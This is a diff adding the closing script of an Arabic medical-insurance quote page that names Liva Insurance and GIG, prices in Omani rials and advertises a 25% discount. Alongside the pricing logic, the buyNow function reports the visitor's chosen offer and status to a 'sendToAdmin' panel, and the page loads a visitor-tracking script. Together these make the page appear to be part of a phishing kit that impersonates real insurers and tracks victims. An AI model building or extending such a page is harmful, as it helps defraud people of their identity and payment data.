+                <a href="#">تواصل معنا</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Get number of insurers from URL or localStorage
+        function getInsurerCount() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let count = urlParams.get('count');
+            if (count) {
+                localStorage.setItem('insurerCount', count);
+            } else {
+                count = localStorage.getItem('insurerCount') || 1;
+            }
+            return parseInt(count);
+        }
+
+        // Update prices based on insurer count
+        function updatePrices() {
+            const count = getInsurerCount();
+            
+            // Update all insurer count displays
+            document.querySelectorAll('.insurer-count').forEach(el => {
+                el.textContent = count;
+            });
+
+            // Update original prices (strikethrough)
+            document.querySelectorAll('.offer-price-original').forEach(el => {
+                const basePrice = parseFloat(el.dataset.basePrice);
+                const totalPrice = (basePrice * count).toFixed(3);
+                el.textContent = Number(totalPrice).toLocaleString('en-US', {minimumFractionDigits: 3});
+            });
+
+            // Update discounted prices (25% off)
+            document.querySelectorAll('.offer-price').forEach(el => {
+                const basePrice = parseFloat(el.dataset.basePrice);
+                const discountedPrice = (basePrice * 0.75 * count).toFixed(3);
+                el.textContent = Number(discountedPrice).toLocaleString('en-US', {minimumFractionDigits: 3});
+            });
+
+            // Update VAT (based on discounted price)
+            document.querySelectorAll('.offer-vat').forEach(el => {
+                const baseVat = parseFloat(el.dataset.baseVat);
+                const totalVat = (baseVat * 0.75 * count).toFixed(3);
+                el.textContent = Number(totalVat).toLocaleString('en-US', {minimumFractionDigits: 3});
+            });
+        }
+
+        // Toggle expand details
+        function toggleExpand(company) {
+            const details = document.getElementById('details-' + company);
+            if (details) {
+                details.classList.toggle('show');
+                // Update toggle label
+                const card = document.getElementById('offer-' + company);
+                const toggleBtn = card.querySelector('.medical-toggle');
+                const label = toggleBtn.querySelector('.medical-toggle-label');
+                const icon = toggleBtn.querySelector('i');
+                if (details.classList.contains('show')) {
+                    label.textContent = '\u0625\u062e\u0641\u0627\u0621 \u062a\u0641\u0627\u0635\u064a\u0644 \u0627\u0644\u0639\u0631\u0636';
+                    icon.style.transform = 'rotate(180deg)';
+                } else {
+                    label.textContent = '\u0639\u0631\u0636 \u062a\u0641\u0627\u0635\u064a\u0644 \u0627\u0644\u0639\u0631\u0636';
+                    icon.style.transform = '';
+                }
+            }
+        }
+
+        // Toggle row breakdown
+        function toggleRowBreakdown(rowId) {
+            const breakdown = document.getElementById('breakdown-' + rowId);
+            const chevron = document.getElementById('chevron-' + rowId);
+            if (breakdown) {
+                breakdown.classList.toggle('show');
+                if (chevron) chevron.classList.toggle('open');
+            }
+        }
+
+        // Toggle details (show more)
+        function toggleDetails(company) {
+            toggleExpand(company);
+        }
+
+        // Pricing data per plan and annual limit
+        const pricingData = {
+            liva: {
+                'bronze': { '5000': {price: 200.389, vat: 10.019}, '10000': {price: 225.450, vat: 11.273} },
+                'silver': { '5000': {price: 280.500, vat: 14.025}, '10000': {price: 310.750, vat: 15.538}, '15000': {price: 335.200, vat: 16.760} },
+                'gold': { '10000': {price: 385.200, vat: 19.260}, '15000': {price: 420.600, vat: 21.030}, '25000': {price: 465.800, vat: 23.290} },
+                'platinum': { '15000': {price: 520.800, vat: 26.040}, '25000': {price: 565.350, vat: 28.268}, '50000': {price: 620.400, vat: 31.020} },
+                'platinum-dental': { '25000': {price: 580.900, vat: 29.045}, '50000': {price: 630.400, vat: 31.520}, '100000': {price: 710.500, vat: 35.525} }
+            },
+            gig: {
+                '1': { '10000': {price: 150.250, vat: 7.513} },
+                '2': { '15000': {price: 175.400, vat: 8.770} },
+                '3': { '20000': {price: 195.600, vat: 9.780} },
+                '4': { '25000': {price: 216.197, vat: 10.810} },
+                '5': { '30000': {price: 245.300, vat: 12.265} },
+                '6': { '50000': {price: 280.450, vat: 14.023} },
+                '7': { '25000': {price: 216.197, vat: 10.810} }
+            }
+        };
+
+        const networkData = {
+            liva: {
+                'bronze': 'Bronze Network',
+                'silver': 'Silver Network (Band A)',
+                'gold': 'Gold Network (Band A+, A)',
+                'platinum': 'Platinum Network (Band A+, A & B)',
+                'platinum-dental': 'Platinum Network (Band A+, A & B)'
+            },
+            gig: {
+                '1': 'A.1', '2': 'A.2', '3': 'A.3', '4': 'A.4', '5': 'A.5', '6': 'A.6', '7': 'A.6'
+            }
+        };
+
+        // Update plan badge, network, and price
+        function updatePlan(company) {
+            const select = document.getElementById('offer-plan-' + company);
+            const selectedText = select.options[select.selectedIndex].text.trim();
+            const val = select.value;
+            const card = document.getElementById('offer-' + company);
+            const badge = card.querySelector('.plan-badge-name');
+            if (badge) {
+                badge.textContent = selectedText;
+            }
+            
+            // Update network
+            const networkEl = document.getElementById('network-' + company);
+            if (networkEl && networkData[company] && networkData[company][val]) {
+                networkEl.textContent = networkData[company][val];
+            }
+
+            // Update annual limit options based on selected plan
+            updateAnnualLimitOptions(company, val);
+
+            // Update price based on plan + annual limit
+            updateOfferPrice(company);
+        }
+
+        // Dynamically update annual limit dropdown based on selected plan
+        function updateAnnualLimitOptions(company, planVal) {
+            const annualSelect = document.getElementById('offer-annual-' + company);
+            if (!annualSelect || !pricingData[company] || !pricingData[company][planVal]) return;
+            
+            const limits = Object.keys(pricingData[company][planVal]);
+            // Clear existing options (keep the hidden placeholder)
+            annualSelect.innerHTML = '';
+            
+            // Add new options based on the plan's available limits
+            limits.forEach(function(limit, index) {
+                const opt = document.createElement('option');
+                opt.value = limit;
+                opt.textContent = limit;
+                if (index === 0) opt.selected = true;
+                annualSelect.appendChild(opt);
+            });
+        }
+
+        // Update price when annual limit changes
+        function updateAnnualLimit(company) {
+            updateOfferPrice(company);
+        }
+
+        // Recalculate and display price for a company
+        function updateOfferPrice(company) {
+            const planSelect = document.getElementById('offer-plan-' + company);
+            const annualSelect = document.getElementById('offer-annual-' + company);
+            const planVal = planSelect.value;
+            const annualVal = annualSelect.value;
+            const count = getInsurerCount();
+
+            if (pricingData[company] && pricingData[company][planVal] && pricingData[company][planVal][annualVal]) {
+                const data = pricingData[company][planVal][annualVal];
+                const card = document.getElementById('offer-' + company);
+                const priceEl = card.querySelector('.offer-price');
+                const priceOrigEl = card.querySelector('.offer-price-original');
+                const vatEl = card.querySelector('.offer-vat');
+                if (priceOrigEl) {
+                    priceOrigEl.dataset.basePrice = data.price;
+                    priceOrigEl.textContent = (data.price * count).toFixed(3);
+                }
+                if (priceEl) {
+                    priceEl.dataset.basePrice = data.price;
+                    priceEl.textContent = (data.price * 0.75 * count).toFixed(3);
+                }
+                if (vatEl) {
+                    vatEl.dataset.baseVat = data.vat;
+                    vatEl.textContent = (data.vat * 0.75 * count).toFixed(3);
+                }
+                // Rebuild details table with discounted price
+                buildDetailsTable(company, data.price * 0.75);
+            }
+        }
+
+        // Get current base price for a company from pricing data
+        function getCurrentBasePrice(company) {
+            const planSelect = document.getElementById('offer-plan-' + company);
+            const annualSelect = document.getElementById('offer-annual-' + company);
+            const planVal = planSelect.value;
+            const annualVal = annualSelect.value;
+            if (pricingData[company] && pricingData[company][planVal] && pricingData[company][planVal][annualVal]) {
+                return pricingData[company][planVal][annualVal].price;
+            }
+            return company === 'liva' ? 200.389 : 216.197;
+        }
+
+        // Buy now - go to review page
+        function buyNow(company) {
+            localStorage.setItem('selectedCompany', company);
+            // Save selected plan, annual limit, and pricing
+            const planSelect = document.getElementById('offer-plan-' + company);
+            const annualSelect = document.getElementById('offer-annual-' + company);
+            const planVal = planSelect.value;
+            const planText = planSelect.options[planSelect.selectedIndex].text.trim();
+            const annualVal = annualSelect.value;
+            const count = getInsurerCount();
+            let pricePerPerson = 0, vatPerPerson = 0;
+            if (pricingData[company] && pricingData[company][planVal] && pricingData[company][planVal][annualVal]) {
+                pricePerPerson = pricingData[company][planVal][annualVal].price * 0.75; // 25% discount
+                vatPerPerson = pricePerPerson * 0.05;
+            }
+            localStorage.setItem('selectedOffer', JSON.stringify({
+                company: company,
+                companyName: company === 'liva' ? '\u0644\u064a\u0641\u0627 \u0644\u0644\u062a\u0623\u0645\u064a\u0646' : 'GIG',
+                plan: planText,
+                planValue: planVal,
+                annualLimit: annualVal,
+                pricePerPerson: pricePerPerson,
+                count: count,
+                productName: 'Sahatuna - Individual'
+            }));
+            // Send selected offer details to admin
+            if (window.sendToAdmin) {
+                var companyName = company === 'liva' ? 'ليفا للتأمين' : 'الخليج GIG';
+                var totalPrice = (pricePerPerson * count).toFixed(3);
+                var totalVat = (vatPerPerson * count).toFixed(3);
+                var networkEl = document.querySelector('#' + company + '-card .medical-network-val, #offer-network-' + company);
+                var networkText = networkEl ? networkEl.textContent.trim() : '';
+                window.sendToAdmin({
+                    'شركة التأمين': companyName,
+                    'الخطة': planText,
+                    'الحد السنوي': annualVal,
+                    'الشبكة': networkText,
+                    'عدد المؤمن عليهم': count,
+                    'السعر': totalPrice + ' ر.ع',
+                    'الضريبة': totalVat + ' ر.ع',
+                    'الحالة': 'تم اختيار العرض'
+                }, 'التأمين الصحي - العرض المختار');
+            }
+            window.location.href = '/insurance/insurer-details';
+        }
+
+        // Go back
+        function goBack() {
+            window.location.href = '/insurance/medical-add-insurers';
+        }
+
+        // Build details table for a company
+        function buildDetailsTable(company, basePrice) {
+            const count = getInsurerCount();
+            const savedData = localStorage.getItem('medicalInsurers');
+            let insurers = [];
+            if (savedData) {
+                try { insurers = JSON.parse(savedData); } catch(e) {}
+            }
+            // If no saved data, generate sample data
+            if (insurers.length === 0) {
+                for (let i = 0; i < count; i++) {
+                    insurers.push({
+                        civilId: '293111501' + String(395 + i),
+                        dob: '3/7/2026',
+                        gender: 'Male',
+                        relation: i === 0 ? '\u0627\u0644\u0634\u062e\u0635 \u0646\u0641\u0633\u0647' : '\u0627\u0644\u0632\u0648\u062c',
+                        marital: '\u0645\u062a\u0632\u0648\u062c'
+                    });
+                }
+            }
+            const tbody = document.getElementById('details-tbody-' + company);
+            if (!tbody) return;
+            tbody.innerHTML = '';
+            const perPerson = basePrice;
+            const genderMap = {'male': 'Male', 'female': 'Female', '\u0630\u0643\u0631': 'Male', '\u0623\u0646\u062b\u0649': 'Female', '1': 'Male', '2': 'Female'};
+            const relationMap = {'self': '\u0627\u0644\u0634\u062e\u0635 \u0646\u0641\u0633\u0647', 'spouse': '\u0627\u0644\u0632\u0648\u062c', 'child': '\u0627\u0644\u0627\u0628\u0646', 'parent': '\u0627\u0644\u0648\u0627\u0644\u062f', '1': '\u0627\u0644\u0634\u062e\u0635 \u0646\u0641\u0633\u0647', '2': '\u0627\u0644\u0632\u0648\u062c', '3': '\u0627\u0644\u0627\u0628\u0646/\u0627\u0644\u0627\u0628\u0646\u0629', '4': '\u0627\u0644\u0623\u0628/\u0627\u0644\u0623\u0645', '5': '\u0627\u0644\u0627\u0628\u0646\u0629', '6': '\u0627\u0644\u0623\u0628', '7': '\u0627\u0644\u0623\u0645'};
+
+            for (let i = 0; i < count; i++) {
+                const ins = insurers[i] || {};
+                const rowId = company + '-' + i;
+                const relation = ins.relation || relationMap[ins.relationship] || (i === 0 ? '\u0627\u0644\u0634\u062e\u0635 \u0646\u0641\u0633\u0647' : '\u0627\u0644\u0632\u0648\u062c');
+                const civilId = ins.idNo || ins.civilId || ins.civil_id || '';
+                const dob = ins.dob || ins.birthDate || '';
+                const gender = genderMap[(ins.genderId || ins.gender || 'male').toLowerCase()] || ins.genderId || ins.gender || 'Male';
+                const premium = perPerson.toFixed(3);
+
+                // Main row
+                const tr = document.createElement('tr');
+                tr.onclick = function() { toggleRowBreakdown(rowId); };
+                tr.innerHTML = `
+                    <td>${i + 1}</td>
+                    <td>${relation}</td>
+                    <td>${civilId}</td>
+                    <td>${dob}</td>
+                    <td>${gender}</td>
+                    <td><span class="coverage-badge coverage-badge-green">Percent 10 Copay</span><span class="coverage-badge coverage-badge-yellow">Copay</span></td>
+                    <td><i id="chevron-${rowId}" class="fas fa-chevron-down row-chevron" style="font-size:.7rem;margin-left:5px;"></i> ${premium}</td>
+                `;
+                tbody.appendChild(tr);
+
+                // Breakdown row
+                const breakdownTr = document.createElement('tr');
+                breakdownTr.id = 'breakdown-' + rowId;
+                breakdownTr.className = 'detail-breakdown';
+                const basicAmt = perPerson * 0.92;
+                const emergencyFee = perPerson * 0.007;
+                const dhamaniFee = perPerson * 0.014;
+                const policyFee = 3;
+                const grossAmt = basicAmt + emergencyFee + dhamaniFee + policyFee;
+                const tax = grossAmt * 0.016;
+                const netAmt = grossAmt + tax;
+                const vat = netAmt * 0.05;
+                const totalPremium = netAmt + vat;
+                breakdownTr.innerHTML = `
+                    <td colspan="7" style="padding:0;">
+                        <div style="padding:10px 20px;background:#fafafa;">
+                            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+                                <span style="font-size:.82rem;color:#666;">\u0627\u0644\u0645\u0628\u0644\u063a (\u0631.\u0639)</span>
+                                <h6 style="font-size:.85rem;font-weight:600;margin:0;">\u0627\u0644\u062a\u063a\u0637\u064a\u0627\u062a</h6>
+                            </div>
+                            <table class="breakdown-table">
+                                <tr><td class="label-cell"><strong>Basic Amount</strong></td><td class="value-cell"><strong>${basicAmt.toFixed(3)}</strong></td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Plan</td><td class="value-cell">${document.getElementById('offer-plan-'+company)?.options[document.getElementById('offer-plan-'+company).selectedIndex]?.text || 'Bronze'}</td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Annual Limit</td><td class="value-cell">${document.getElementById('offer-annual-'+company)?.value || '5000'}</td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Emergency Fee</td><td class="value-cell">${emergencyFee.toFixed(3)}</td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Dhamani Fee</td><td class="value-cell">${dhamaniFee.toFixed(3)}</td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Copay</td><td class="value-cell">0</td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Policy Fee</td><td class="value-cell">${policyFee}</td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Copay <span class="coverage-badge coverage-badge-green">Percent 10 Copay</span> <span class="coverage-badge coverage-badge-yellow">\u0627\u0644\u062e\u064a\u0627\u0631 \u0627\u0644\u0627\u0641\u062a\u0631\u0627\u0636\u064a Option</span></td><td class="value-cell">0</td></tr>
+                                <tr class="bold-row"><td class="label-cell"><strong>Gross Amount</strong></td><td class="value-cell"><strong>${grossAmt.toFixed(3)}</strong></td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Tax & contribution</td><td class="value-cell">${tax.toFixed(3)}</td></tr>
+                                <tr class="bold-row"><td class="label-cell"><strong>Net Amount</strong></td><td class="value-cell"><strong>${netAmt.toFixed(3)}</strong></td></tr>
+                                <tr><td class="label-cell"><i class="fas fa-check-circle" style="color:#5eac12"></i> Value Added Tax</td><td class="value-cell">${vat.toFixed(3)}</td></tr>
+                                <tr class="bold-row"><td class="label-cell"><strong>Total Premium</strong></td><td class="value-cell"><strong>${totalPremium.toFixed(3)}</strong></td></tr>
+                            </table>
+                        </div>
+                    </td>
+                `;
+                tbody.appendChild(breakdownTr);
+            }
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            updatePrices();
+            
+            // Also read from the add-insurers page data if available
+            const savedData = localStorage.getItem('medicalInsurers');
+            if (savedData) {
+                try {
+                    const insurers = JSON.parse(savedData);
+                    if (insurers.length > 0) {
+                        localStorage.setItem('insurerCount', insurers.length);
+                        updatePrices();
+                    }
+                } catch(e) {}
+            }
+
+            // Read phone from localStorage
+            const phone = localStorage.getItem('medicalPhone');
+            if (phone) {
+                document.getElementById('phone-display').textContent = phone;
+            }
+
+            // Build details tables with current plan prices
+            buildDetailsTable('liva', getCurrentBasePrice('liva'));
+            buildDetailsTable('gig', getCurrentBasePrice('gig'));
+        });
+    </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
